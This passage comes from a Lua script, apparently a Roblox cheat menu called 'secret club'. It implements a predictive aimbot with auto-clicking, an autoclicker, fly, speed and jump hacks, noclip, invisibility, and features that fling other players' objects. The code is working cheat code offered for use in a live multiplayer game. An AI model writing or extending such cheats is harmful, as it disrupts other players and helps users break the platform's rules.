                
                -- Смешиваем текущую и среднюю скорость для стабильности
                local smoothedVelocity = (currentVelocity * 0.7) + (avgVelocity * 0.3)
                
                -- Разделяем на горизонталь и вертикаль
                local horizontalVel = Vector3.new(smoothedVelocity.X, 0, smoothedVelocity.Z)
                local horizontalSpeed = horizontalVel.Magnitude
                local verticalVel = smoothedVelocity.Y
                
                -- 📏 РАСЧЁТ ВРЕМЕНИ ПОЛЁТА (более точный)
                local mySpeed = 600 -- Базовая скорость подлёта
                
                -- Учитываем дистанцию для расчёта времени
                if currentDistance > 50 then 
                    mySpeed = 900
                elseif currentDistance > 30 then 
                    mySpeed = 700
                elseif currentDistance > 15 then 
                    mySpeed = 500
                elseif currentDistance > 8 then 
                    mySpeed = 300
                else 
                    mySpeed = 150
                end
                
                local timeToReach = currentDistance / mySpeed
                
                -- 🎯 ДИНАМИЧЕСКИЙ ПРЕДИКТ В ЗАВИСИМОСТИ ОТ СКОРОСТИ ЦЕЛИ
                local horizontalPredictTime
                local forwardOffset
                
                if horizontalSpeed > 60 then
                    -- Очень быстрое движение
                    horizontalPredictTime = basePredict + (timeToReach * 1.0) + (horizontalSpeed / 150)
                    forwardOffset = 10 + (horizontalSpeed / 8)
                elseif horizontalSpeed > 35 then
                    -- Быстрое движение
                    horizontalPredictTime = basePredict + (timeToReach * 0.8) + (horizontalSpeed / 200)
                    forwardOffset = 7 + (horizontalSpeed / 10)
                elseif horizontalSpeed > 15 then
                    -- Среднее движение
                    horizontalPredictTime = basePredict + (timeToReach * 0.6) + (horizontalSpeed / 250)
                    forwardOffset = 5 + (horizontalSpeed / 12)
                elseif horizontalSpeed > 5 then
                    -- Медленное движение
                    horizontalPredictTime = basePredict + (timeToReach * 0.4)
                    forwardOffset = 3
                else
                    -- Почти стоит
                    horizontalPredictTime = basePredict * 0.3
                    forwardOffset = 1
                end
                
                -- 🧭 ГОРИЗОНТАЛЬНАЯ ПРЕДСКАЗАННАЯ ПОЗИЦИЯ
                local horizontalPredict = Vector3.new(
                    targetHRP.Position.X + (horizontalVel.X * horizontalPredictTime),
                    targetHRP.Position.Y,
                    targetHRP.Position.Z + (horizontalVel.Z * horizontalPredictTime)
                )
                
                -- Добавляем forward offset
                if horizontalSpeed > 2 then
                    local moveDirection = horizontalVel.Unit
                    horizontalPredict = horizontalPredict + (moveDirection * forwardOffset)
                end
                
                -- 📐 УЧЁТ НАПРАВЛЕНИЯ ДВИЖЕНИЯ (цель бежит к тебе или от тебя?)
                if horizontalSpeed > 3 then
                    local myPosFlat = Vector3.new(myHRP.Position.X, 0, myHRP.Position.Z)
                    local targetPosFlat = Vector3.new(targetHRP.Position.X, 0, targetHRP.Position.Z)
                    local directionToTarget = (targetPosFlat - myPosFlat).Unit
                    local targetMoveDirection = horizontalVel.Unit
                    local dotProduct = directionToTarget:Dot(targetMoveDirection)
                    
                    -- Цель бежит К ТЕБЕ - уменьшаем предикт
                    if dotProduct < -0.6 then
                        local reduction = horizontalVel * 0.15
                        horizontalPredict = horizontalPredict - Vector3.new(reduction.X, 0, reduction.Z)
                    -- Цель бежит ОТ ТЕБЯ - увеличиваем предикт
                    elseif dotProduct > 0.6 then
                        local addition = horizontalVel * 0.2
                        horizontalPredict = horizontalPredict + Vector3.new(addition.X, 0, addition.Z)
                    end
                end
                
                -- ⬆️ УЛУЧШЕННАЯ ВЕРТИКАЛЬНАЯ КОМПЕНСАЦИЯ
                local verticalY = targetHRP.Position.Y
                
                -- Проверяем состояние цели
                local targetState = targetHumanoid and targetHumanoid:GetState()
                local isTargetJumping = targetState == Enum.HumanoidStateType.Jumping or 
                                       targetState == Enum.HumanoidStateType.Freefall
                
                -- Разные коэффициенты для разных состояний
                if verticalVel > 15 then
                    -- Быстрый подъём (прыжок)
                    verticalY = verticalY + (verticalVel * horizontalPredictTime * 0.25)
                elseif verticalVel > 5 then
                    -- Медленный подъём
                    verticalY = verticalY + (verticalVel * horizontalPredictTime * 0.35)
                elseif verticalVel < -15 then
                    -- Быстрое падение
                    verticalY = verticalY + (verticalVel * horizontalPredictTime * 0.2)
                elseif verticalVel < -5 then
                    -- Медленное падение
                    verticalY = verticalY + (verticalVel * horizontalPredictTime * 0.3)
                else
                    -- На земле или почти нет вертикального движения
                    if isTargetJumping then
                        verticalY = verticalY + (verticalVel * horizontalPredictTime * 0.4)
                    else
                        verticalY = targetHRP.Position.Y
                    end
                end
                
                -- 🎯 ФИНАЛЬНАЯ ПОЗИЦИЯ
                predictedPosition = Vector3.new(horizontalPredict.X, verticalY, horizontalPredict.Z)
                
                -- 🔥 ДОПОЛНИТЕЛЬНАЯ КОМПЕНСАЦИЯ ДЛЯ БЛИЗКОЙ ДИСТАНЦИИ
                if currentDistance < 10 then
                    -- На близкой дистанции уменьшаем предикт (более точно)
                    local reduction = (predictedPosition - targetHRP.Position) * 0.3
                    predictedPosition = predictedPosition - reduction
                end
            end
            
            local distance = (predictedPosition - myHRP.Position).Magnitude
            
            -- 🚀 АДАПТИВНАЯ СКОРОСТЬ (более плавная)
            local speed
            if isDisabled then
                speed = 25
            else
                if distance > 50 then 
                    speed = 900
                elseif distance > 30 then 
                    speed = 700
                elseif distance > 15 then 
                    speed = 500
                elseif distance > 8 then 
                    speed = 300
                elseif distance > 4 then
                    speed = 150
                else 
                    speed = 80
                end
            end
            
            -- Плавное изменение скорости
            local currentSpeed = gh_currentBV.Velocity.Magnitude
            if math.abs(currentSpeed - speed) > 50 then
                speed = currentSpeed + ((speed - currentSpeed) * 0.5)
            end
            
            gh_currentBV.Velocity = (predictedPosition - myHRP.Position).Unit * speed
            camera.CFrame = CFrame.new(camera.CFrame.Position, targetHead.Position)
            
            -- 👊 АВТОКЛИК (улучшенный)
            if distance < 25 and not _G.IsResetting and not isDisabled then
                VirtualUser:CaptureController()
                VirtualUser:ClickButton1(Vector2.new(0,0))
            end
        else
            if gh_currentBV then 
                gh_currentBV:Destroy()
                gh_currentBV = nil 
            end
            if myChar and myHumanoid and not isDead then
                myHumanoid.AutoRotate = true
            end
            -- Очищаем историю если не атакуем
            positionHistory = {}
        end
        task.wait(0.01)
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        if _G.AutoClicker and not UserInputService:GetFocusedTextBox() and not _G.IsResetting then
            vim:SendMouseButtonEvent(0, 0, 0, true, game, 0)
            task.wait(0.01)
            vim:SendMouseButtonEvent(0, 0, 0, false, game, 0)
        end
    end
end)

-- ========================================
-- PHYSICS LAB RUNTIME
-- ========================================

task.spawn(function()
    while true do
        if blackholeActive then
            local h = Instance.new("Part", workspace)
            h.Shape = "Ball"
            h.Size = Vector3.new(6,6,6)
            h.Transparency = 0.5
            h.Material = "Neon"
            h.Color = Color3.new(0.5,0,1)
            h.Anchored = true
            h.CanCollide = false
            while blackholeActive do
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    h.Position = hrp.Position + hrp.CFrame.LookVector * 25
                    for _, v in pairs(workspace:GetPartBoundsInRadius(h.Position, 80)) do
                        if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(LocalPlayer.Character) then 
                            v.AssemblyLinearVelocity = (h.Position - v.Position).Unit * 150 
                        end
                    end
                end
                task.wait(0.03)
            end
            h:Destroy()
        end
        task.wait(1)
    end
end)

task.spawn(function()
    while true do
        if vacuumActive then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local targetPos = hrp.Position + (hrp.CFrame.LookVector * 25)
                local parts = workspace:FindPartsInRegion3(Region3.new(hrp.Position - Vector3.new(50,50,50), hrp.Position + Vector3.new(50,50,50)), nil, 100)
                for _, v in pairs(parts) do
                    if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(LocalPlayer.Character) then
                        v.AssemblyLinearVelocity = (targetPos - v.Position).Unit * 120
                    end
                end
            end
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        if spiderMode then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local ray = Ray.new(hrp.Position, hrp.CFrame.LookVector * 3)
                local part = workspace:FindPartOnRay(ray, LocalPlayer.Character)
                if part then hrp.AssemblyLinearVelocity = Vector3.new(0, 45, 0) + (hrp.CFrame.LookVector * 20) end
            end
        end
        task.wait(0.1)
    end
end)

task.spawn(function()
    if not airWalkPlate then
        airWalkPlate = Instance.new("Part")
        airWalkPlate.Size = Vector3.new(10, 0.5, 10)
        airWalkPlate.Anchored = true
        airWalkPlate.Transparency = 0.8
        airWalkPlate.Color = Color3.fromRGB(0, 255, 255)
    end
    while true do
        if airWalk then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                airWalkPlate.Parent = workspace
                airWalkPlate.CFrame = hrp.CFrame * CFrame.new(0, -3.2, 0)
            end
        else
            if airWalkPlate then airWalkPlate.Parent = nil end
        end
        RunService.Heartbeat:Wait()
    end
end)

local function setupCharacterPhysics(char)
    task.wait(0.5)
    local hum = char:FindFirstChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    hum.StateChanged:Connect(function(old, new)
        if seismicActive and new == Enum.HumanoidStateType.Landed then
            local p = Instance.new("Part", workspace)
            p.Shape = Enum.PartType.Ball
            p.Size = Vector3.new(2, 2, 2)
            p.Position = hrp.Position - Vector3.new(0, 3, 0)
            p.Anchored = true
            p.CanCollide = false
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromRGB(255, 0, 0)
            
            task.spawn(function()
                for i = 1, 20 do
                    p.Size = p.Size + Vector3.new(5, 0.2, 5)
                    p.Transparency = i/20
                    task.wait()
                end
                p:Destroy()
            end)

            local region = Region3.new(hrp.Position - Vector3.new(50, 10, 50), hrp.Position + Vector3.new(50, 20, 50))
            local parts = workspace:FindPartsInRegion3(region, char, 200)
            for _, v in pairs(parts) do
                if v:IsA("BasePart") and not v.Anchored then
                    local direction = (v.Position - hrp.Position).Unit
                    v.AssemblyLinearVelocity = (direction * 150) + Vector3.new(0, 250, 0)
                end
            end
        end
    end)

    hrp.Touched:Connect(function(hit)
        if kickActive and hit:IsA("BasePart") and not hit.Anchored and not hit:IsDescendantOf(char) then
            hit.AssemblyLinearVelocity = (hit.Position - hrp.Position).Unit * 250
        end
    end)
end

if LocalPlayer.Character then setupCharacterPhysics(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(setupCharacterPhysics)

-- MAIN GAME LOOP
local lastUpdate = 0
local updateInterval = 0.016

RunService.Heartbeat:Connect(function(dt)
    local now = tick()
    if now - lastUpdate < updateInterval then return end
    lastUpdate = now
    
    local char = LocalPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChild("Humanoid")
    
    if flyEnabled and root and bv and bg then
        local cam = workspace.CurrentCamera
        local move = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0, 1, 0) end
        bv.Velocity = move.Magnitude > 0 and move.Unit * flySpeed or Vector3.zero
        bg.CFrame = cam.CFrame
    end
    
    if speedHackEnabled and humanoid then humanoid.WalkSpeed = walkSpeed end
    if jumpHackEnabled and humanoid then humanoid.JumpPower = jumpPower end
    
    if noclipEnabled then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end
end)

LocalPlayer.CharacterAdded:Connect(function(char)
    flyEnabled = false
    if bv then bv:Destroy(); bv = nil end
    if bg then bg:Destroy(); bg = nil end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    local inTextBox = UserInputService:GetFocusedTextBox() ~= nil
    
    if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.Delete then
        MainFrame.Visible = not MainFrame.Visible
    end
    
    if input.KeyCode == flyKeybind and not inTextBox and not waitingForFlyKey then
        flyEnabled = not flyEnabled
        toggleFlyState(flyEnabled)
        if flyToggleButton then
            local switch = flyToggleButton:FindFirstChildOfClass("TextButton")
            if switch then
                TweenService:Create(switch, TweenInfo.new(0.15), {
                    BackgroundColor3 = flyEnabled and Color3.fromRGB(100, 80, 200) or Color3.fromRGB(40, 38, 48)
                }):Play()
            end
        end
    end
    
    -- 🔥 НОВЫЙ КОД ДЛЯ INVISIBILITY 🔥
    if input.KeyCode == invisKeybind and not inTextBox and not waitingForInvisKey then
        isInvisible = not isInvisible
        
        if isInvisible then
            pcall(Invisibile)
        else
            pcall(Uninvisible)
        end
        
        -- Обновляем визуальное состояние toggle переключателя
        for _, page in pairs({FunPage}) do
            if page and page.Visible then
                for _, column in pairs(page:GetChildren()) do
                    if column.Name == "LeftColumn" then
                        for _, toggle in pairs(column:GetChildren()) do
                            if toggle:IsA("Frame") then
                                local label = toggle:FindFirstChild("TextLabel")
                                if label and label.Text == "Invisibility" then
                                    local switch = toggle:FindFirstChildOfClass("TextButton")
                                    if switch then
                                        TweenService:Create(switch, TweenInfo.new(0.15), {
                                            BackgroundColor3 = isInvisible and Color3.fromRGB(100, 80, 200) or Color3.fromRGB(40, 38, 48)
                                        }):Play()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    -- 🔥 КОНЕЦ КОДА ДЛЯ INVISIBILITY 🔥
    
    if input.KeyCode == Enum.KeyCode.K and not inTextBox then
        _G.AutoClicker = not _G.AutoClicker
    end
end)

-- ========================================
-- WATERMARK (опционально)
-- ========================================
local wmFrame, wmGlow, wmLabel, wmStroke
do
task.spawn(function()
    task.wait(1)
    
    local WMHeader = createSectionHeader("Watermark")
    WMHeader.Parent = PlayersRight
    
    local fpsQueue = {}
    local fpsMax = 10
    local wmLastUpdate = 0
    local wmEnabled = false
    
    local function avgFPS(fps)
        table.insert(fpsQueue, fps)
        if #fpsQueue > fpsMax then table.remove(fpsQueue, 1) end
        local sum = 0
        for i = 1, #fpsQueue do sum = sum + fpsQueue[i] end
        return math.round(sum / #fpsQueue)
    end
    
    local function formatTime() return os.date("%H:%M") end
    
    local function pingCol(p)
        if p < 60 then return "#5cdc5c"
        elseif p < 120 then return "#e0d44a"
        else return "#e05050" end
    end
    
    local wmGui = Instance.new("ScreenGui")
    wmGui.Name = "SecretClubWatermark"
    wmGui.ResetOnSpawn = false
    wmGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    wmGui.Parent = PlayerGui
    
    wmGlow = Instance.new("Frame")
    wmGlow.Name = "Glow"
    wmGlow.Size = UDim2.new(0, 240, 0, 32)
    wmGlow.Position = UDim2.new(1, -250, 0, -6)
    wmGlow.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
    wmGlow.BackgroundTransparency = 0.85
    wmGlow.ZIndex = 999
    wmGlow.Visible = false
    wmGlow.Parent = wmGui
    
    local glowCorner = Instance.new("UICorner")
    glowCorner.CornerRadius = UDim.new(0, 8)
    glowCorner.Parent = wmGlow
    
    wmFrame = Instance.new("Frame")
    wmFrame.Name = "WMFrame"
    wmFrame.Size = UDim2.new(0, 230, 0, 24)
    wmFrame.Position = UDim2.new(1, -245, 0, -2)
    wmFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
    wmFrame.BackgroundTransparency = 0.2
    wmFrame.ZIndex = 1000
    wmFrame.Visible = false
    wmFrame.Parent = wmGui
    
    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 6)
    frameCorner.Parent = wmFrame
    
    wmStroke = Instance.new("UIStroke")
    wmStroke.Color = Color3.fromRGB(100, 80, 200)
    wmStroke.Thickness = 1
    wmStroke.Transparency = 0.5
    wmStroke.Parent = wmFrame
    
    wmLabel = Instance.new("TextLabel")
    wmLabel.Size = UDim2.new(1, -12, 1, 0)
    wmLabel.Position = UDim2.new(0, 6, 0, 0)
    wmLabel.BackgroundTransparency = 1
    wmLabel.Font = Enum.Font.GothamMedium
    wmLabel.TextSize = 11
    wmLabel.TextColor3 = Color3.fromRGB(210, 220, 230)
    wmLabel.TextStrokeTransparency = 0.85
    wmLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    wmLabel.TextScaled = false
    wmLabel.TextXAlignment = Enum.TextXAlignment.Left
    wmLabel.RichText = true
    wmLabel.Text = '<font color="#88d4ff">secret club</font>'
    wmLabel.ZIndex = 1001
    wmLabel.Parent = wmFrame
    
    createToggle(PlayersRight, "Show Watermark", false, function(enabled)
        wmEnabled = enabled
        wmFrame.Visible = enabled
        wmGlow.Visible = enabled
        
        if enabled then
            wmFrame.Position = UDim2.new(1, 50, 0, -2)
            wmGlow.Position = UDim2.new(1, 55, 0, -6)
            
            local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            TweenService:Create(wmFrame, info, {Position = UDim2.new(1, -245, 0, -2)}):Play()
            TweenService:Create(wmGlow, info, {Position = UDim2.new(1, -250, 0, -6)}):Play()
        end
    end)
    
    local isDragging = false
    local dragOffset = Vector2.new(0, 0)
    
    wmFrame.InputBegan:Connect(function(input, consumed)
        if consumed then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = true
            local mouse = UserInputService:GetMouseLocation()
            dragOffset = Vector2.new(mouse.X - wmFrame.AbsolutePosition.X, mouse.Y - wmFrame.AbsolutePosition.Y)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then isDragging = false end
    end)
    
    RunService.RenderStepped:Connect(function(dt)
        if not wmEnabled then return end
        
        if isDragging then
            local mouse = UserInputService:GetMouseLocation()
            local screen = workspace.CurrentCamera.ViewportSize
            local x = math.clamp(mouse.X - dragOffset.X, 0, screen.X - wmFrame.AbsoluteSize.X)
            local y = math.clamp(mouse.Y - dragOffset.Y, -50, screen.Y - wmFrame.AbsoluteSize.Y)
            wmFrame.Position = UDim2.new(0, x, 0, y)
            wmGlow.Position = UDim2.new(0, x - 5, 0, y - 4)
        end
        
        local now = tick()
        if now - wmLastUpdate < 0.5 then return end
        wmLastUpdate = now
        
        local fps = avgFPS(math.round(1 / dt))
        local ping = math.round(LocalPlayer:GetNetworkPing() * 2000)
        
        local txt = string.format(
            '<font color="#88d4ff">secret club</font> <font color="#3a4a60">|</font> <font color="#C8D2DC">%d fps</font> <font color="#3a4a60">|</font> <font color="#909090">ping: </font><font color="%s">%dms</font> <font color="#3a4a60">|</font> <font color="#7aa8c8">%s</font>',
            fps, pingCol(ping), ping, formatTime()
        )
        
        wmLabel.Text = txt
        
        local TextService = game:GetService("TextService")
        local plainText = txt:gsub("<[^>]+>", "")
        local textBounds = TextService:GetTextSize(plainText, wmLabel.TextSize, wmLabel.Font, Vector2.new(1000, 24))
        
        local w = math.ceil(textBounds.X + 16)
        wmFrame.Size = UDim2.new(0, w, 0, 24)
        wmGlow.Size = UDim2.new(0, w + 10, 0, 32)
        
        if not isDragging then
            wmGlow.Position = UDim2.new(0, wmFrame.Position.X.Offset - 5, 0, wmFrame.Position.Y.Offset - 4)
        end
    end)
    
    local oldApplyTheme = ApplyTheme
    ApplyTheme = function(theme)
        oldApplyTheme(theme)
        if wmFrame then TweenService:Create(wmFrame, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgMedium}):Play() end
        if wmStroke then TweenService:Create(wmStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play() end
        if wmGlow then TweenService:Create(wmGlow, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play() end
    end
    
    print("[Watermark] ✓ Loaded in top-right corner!")
end)  -- Closes task.spawn(function() from line 3511
end
